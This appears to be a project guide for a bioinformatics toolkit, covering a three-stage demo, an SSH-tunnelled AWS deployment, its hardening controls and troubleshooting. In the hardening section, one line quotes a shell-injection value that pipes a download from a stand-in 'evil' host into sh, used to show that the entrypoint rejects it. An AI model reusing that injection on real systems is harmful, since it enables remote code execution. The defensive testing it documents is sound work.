# pto-core: the end-to-end demo

Runs three of the five modules in one pass, then serves the CUT&Tag dashboard.

| Stage | Module | What happens |
|:--|:--|:--|
| 1 | `fastq_stream` | 200k synthetic reads into streaming QC, adapter and quality trimming |
| 2 | `scrna_matrix` | sparse expression matrix into a cosine k-NN graph, HNSW or exact |
| 3 | `cuttag_profiler` | indexed BAM plus promoter BED into a signal matrix, then the dashboard |

The whole thing is **offline by default**. Every fixture is either checked into
the repository or synthesised locally, because these tools are built for machines
that cannot send sequence data anywhere. The one optional network step, scanpy's
`pbmc3k` at roughly 5 MB, is used when available and cleanly substituted when
not.

## Quick start on a laptop

```bash
./scripts/run_demo.sh
```

That builds in Release if needed, runs all three stages, and opens the dashboard
on <http://127.0.0.1:8080/>. Expect 2 to 4 minutes on a first run, most of it
compiling, and about 30 seconds on a rerun.

### Prerequisites

| | Requirement |
|:--|:--|
| Everywhere | CMake 3.20 or newer, a C++20 compiler, Python 3.9+ |
| **OpenMP** | **Required.** `brew install libomp` on macOS, `apt install libomp-dev` on Ubuntu |
| `fastq_stream` | zlib; libdeflate is fetched if absent |
| `cuttag_profiler` | htslib (`brew install htslib` or `apt install libhts-dev`) |
| `scrna_matrix`, stage 2 | `pip install pybind11 numpy scipy` |
| Stage 2 with real PBMC data | `pip install scanpy`, optional |

OpenMP is a hard requirement and the build fails without it. That is deliberate.
When it was optional, `_OPENMP` went undefined, every `#pragma omp` compiled to
serial code, and the test suite reported 100% passed while never running a
parallel iteration. A green suite over a silently serial engine is worse than a
build that stops. See the
[README](../README.md#openmp-by-platform).

If pybind11 is missing, the demo skips stage 2 with a warning rather than
failing, because the other two modules do not depend on it.

### Options

```
--port N              dashboard port (default 8080)
--no-serve            run the pipeline, then stop
--offline             never attempt a network download
--rebuild             reconfigure and rebuild from scratch
--refresh-fixtures    regenerate synthetic fixtures
--skip-build          assume the build directory is usable
--threads N           worker threads (default: all cores)
--work-dir DIR        output directory (default ./demo-out)
```

### What you get

```
demo-out/
├── fastq_qc.json          # QC report: per-base quality, adapter content, filters
├── trimmed.fq             # trimmed reads
├── knn_graph.npz          # neighbour_idx, neighbour_sim, k
├── cuttag_matrix.tsv      # regions x bins signal matrix
├── cuttag_profile.tsv     # meta-profile curve
└── fixtures/              # synthesised inputs (reused across runs)
```

A representative run:

```
==> Stage 1/3  fastq_stream: streaming QC and trimming
      reads in 200,000 -> kept 198,974 (99.5%)
      mean Phred 30.2
==> Stage 2/3  scrna_matrix: cosine k-NN graph
      dataset: 10x pbmc3k  2,700 cells x 1,000 genes
      SIMD kernel: scalar   zero-copy: True   nnz: 186,216
      method=hnsw  k=15  0.46s  (5,879 cells/s)
==> Stage 3/3  cuttag_profiler: CUT&Tag signal matrix
      profiled 2000 regions x 80 bins in 0.11 s (18978 regions/s)
```

### Using your own data

The demo fixtures exist so the script runs anywhere. For real inputs, call the
tools directly:

```bash
build/modules/fastq_stream/fastq_stream \
    -i sample.fq.gz --stdout --trim-tail 20 --min-len 30 \
  | bwa-mem2 mem ref.fa - > sample.sam
```

```bash
build/modules/cuttag_profiler/cuttag_profiler profile \
    --bam sample.bam --regions promoters.bed \
    --upstream 2000 --downstream 2000 --bin-size 50 \
    --out-matrix matrix.tsv --out-profile profile.tsv
```

For `scrna_matrix`,
`modules/scrna_matrix/examples/scanpy_integration.ipynb` is a working AnnData
and scanpy integration, and `scrna_anndata.neighbors(adata)` is a drop-in for
`sc.pp.neighbors`.

## AWS deployment

**Read this section before opening any port.**

The dashboard does authenticate. Every `/api/` request requires a per-run
session token, minted from the platform CSPRNG at startup, checked in the
pre-routing handler alongside `Host` and `Origin`, and compared in constant
time. That is finding H1c in
[`SECURITY_HTTP_2026-08-15.md`](SECURITY_HTTP_2026-08-15.md), closed on
2026-08-21, and all nine findings in that document are now closed.

**A per-run token is still not a login system, and it is not an authorization
model.** It is one shared secret for the life of the process. Anyone who has it
has everything under the data root, there are no users, no roles, no revocation
short of restarting the server, and no audit trail. Combined with mandatory
`--data-root` confinement, an exposed port is bounded by the data root rather
than by the whole filesystem. That is a smaller blast radius. It is not a safe
one.

So the deployment kit reaches the dashboard over an SSH tunnel rather than an
open port, and you should keep it that way.

### 1. Launch the instance

* **AMI**: Ubuntu Server 24.04 LTS
* **Type**: `t3.large` or better. Use `c7g.xlarge` for real workloads, since the
  profiler is CPU-bound and thread-scalable.
* **Storage**: 30 GB gp3 minimum, sized to your BAMs
* **Security group inbound**: exactly one rule.

  | Type | Protocol | Port | Source |
  |:--|:--|:--|:--|
  | SSH | TCP | 22 | `<your.ip>/32` |

  No rule for 8080. That is the whole point.

### 2. Provision

```bash
ssh ubuntu@<instance-ip>
git clone <your-repo-url> pto-core
cd pto-core
sudo ./deploy/provision_aws.sh
```

The script installs Docker, the build toolchain including `libomp-dev`, and the
Python dependencies; creates the data directory; seeds it with the demo
fixtures; configures `ufw` to allow SSH only; builds the image; starts the
service; and waits for the health check.

It is idempotent and non-interactive, so it also works as EC2 user-data.

### 3. Connect

From your laptop:

```bash
ssh -N -L 8080:127.0.0.1:8080 ubuntu@<instance-ip>
```

Then open <http://127.0.0.1:8080/>. The tunnel puts the instance's existing
key-based SSH authentication in front of a service whose own credential is a
single shared token.

### 4. Your data

```bash
sudo cp /path/to/*.bam /path/to/*.bam.bai /path/to/*.bed "$PTO_DATA_DIR"/
sudo chown ubuntu:ubuntu "$PTO_DATA_DIR"/*
```

The directory is mounted read-only at `/data` inside the container, and the
server is confined to it. In the dashboard, refer to files as `/data/sample.bam`.

### Managing the service

```bash
cd ~/pto-core/deploy
docker compose logs -f
docker compose restart
docker compose down
PTO_DATA_DIR=/srv/pto/data docker compose up -d --build   # after a pull
```

### What the deployment hardens

Each of these was verified against a running container rather than merely
configured.

| Control | Setting | Why |
|:--|:--|:--|
| Publish address | `127.0.0.1:8080` | Docker's DNAT sits ahead of `ufw`'s INPUT chain, so publishing on `0.0.0.0` bypasses a host firewall rule you might think protects you |
| `--data-root` | mandatory in the binary **and** the entrypoint | The binary refuses to start without it, and the entrypoint fails on the mount the operator forgot |
| Session token | required on every `/api/` request | Constant-time comparison, never logged |
| Data volume | `:ro` | The profiler only ever reads, so there is no write primitive if a path bug is found |
| User | non-root (`profiler`) | Standard containment |
| Root filesystem | `read_only: true` plus tmpfs `/tmp` | Standard containment |
| Capabilities | `cap_drop: ALL`, `no-new-privileges` | This parses untrusted BAM in C++ |
| Resources | 4 GB and 2 CPU | A backstop behind the 1 MiB body cap and the 10M-bin ceiling |
| Bind address | allowlisted in the entrypoint | A second lock on the `--host` value reaching a `std::system` call |

Confirmed against the running stack: a request for `/etc/passwd` returns 400,
`touch /data/x` fails read-only, and an entrypoint given
`PROFILER_BIND="x'; curl evil|sh; echo '"` refuses to start.

### If you really need direct exposure

Do all of these, not one:

1. Put an authenticating reverse proxy in front, such as ALB with Cognito, or
   nginx with mTLS. The session token is a shared secret for one process and is
   not a substitute for user authentication.
2. Restrict the security group source range to known addresses.
3. Terminate TLS at the proxy. The server speaks plaintext HTTP, so the token
   would otherwise cross the network in the clear.
4. Consider whether you want the server compiled in at all. A
   `-DPTO_CLOUD_BUILD=ON` build removes it entirely: no listener, no `serve`
   subcommand, and no `socket`, `bind` or `listen` symbols in the image. The
   safest way to secure a listening port is to ensure it cannot be compiled into
   existence.

## Troubleshooting

| Symptom | Cause and fix |
|:--|:--|
| `configure failed` mentioning OpenMP | `brew install libomp` or `apt install libomp-dev`. To skip that module: `cmake -S . -B build -DPTO_BUILD_SCRNA_MATRIX=OFF` |
| Stage 2 skipped with a warning | pybind11 was missing at configure time: `pip install pybind11` then `./scripts/run_demo.sh --rebuild` |
| `OMP: Error #15` about libomp already initialized | Two OpenMP runtimes in one process. See below; common with conda and mamba on macOS. |
| `htslib not found` | `brew install htslib` or `apt install libhts-dev` |
| Port 8080 in use | `./scripts/run_demo.sh --port 9000` |
| Dashboard blank, or the API returns 421 or 403 | You reached it under a hostname the server does not recognise. Use `127.0.0.1` or `localhost`, not the instance's public DNS. That rejection is the anti-DNS-rebinding control working. |
| The API returns 401 | The session token is missing. Open the URL the server printed, including its `?t=` parameter. A `fetch` added without the dashboard's `api()` helper will 401, which is the failure direction to want. |
| `no such file` from the dashboard on EC2 | Paths are container paths: use `/data/sample.bam` |
| Compose says the port is already allocated | `docker compose down`, or another `cuttag_profiler` is running |
| Demo is slow on first run | It is compiling. Reruns reuse the build, and `--skip-build` skips the check. |

### `OMP: Error #15` with conda or mamba Python on macOS

Anaconda, Miniconda and mambaforge ship their own `lib/libomp.dylib`, pulled in
by numpy and scipy. If `scrna_matrix` is built with Apple Clang it links
Homebrew's `libomp.dylib`, which is a second LLVM OpenMP runtime. Importing the
extension into a conda interpreter then loads both and aborts the process:

```
OMP: Error #15: Initializing libomp.dylib, but found libomp.dylib already initialized.
```

This is not specific to this project. It bites any C++ extension that links
libomp. Because conda is the norm in genomics, it is worth knowing which fix to
reach for.

| Fix | How | Notes |
|:--|:--|:--|
| **Match the runtime** (recommended) | Build with Homebrew GCC: `-DCMAKE_C_COMPILER=gcc-16 -DCMAKE_CXX_COMPILER=g++-16` | GCC links `libgomp`, which does not collide with conda's LLVM `libomp` |
| **Avoid conda for this module** | Build and run against a venv or system Python | The extension is the only thing that needs it |
| `KMP_DUPLICATE_LIB_OK=TRUE` | Do not use it | Upstream calls it unsafe, unsupported and undocumented, and warns that it may cause crashes or silently produce incorrect results. Silently wrong numerics is the worst possible outcome for this library. |

To check what you have:

```bash
otool -L build/modules/scrna_matrix/scrna_matrix_py*.so | grep -i omp
ls "$(python -c 'import sys; print(sys.prefix)')"/lib/libomp.dylib 2>/dev/null
```

Two different `libomp.dylib` paths means you will hit this.

## See also

* [README](../README.md) for build, test and module documentation
* [`../../ARCHITECTURE.md`](../../ARCHITECTURE.md) for how the engines work
* [`REVIEW_2026-08-15.md`](REVIEW_2026-08-15.md), the architecture and security
  review
* [`SECURITY_HTTP_2026-08-15.md`](SECURITY_HTTP_2026-08-15.md), the HTTP audit.
  Read it before exposing the server.
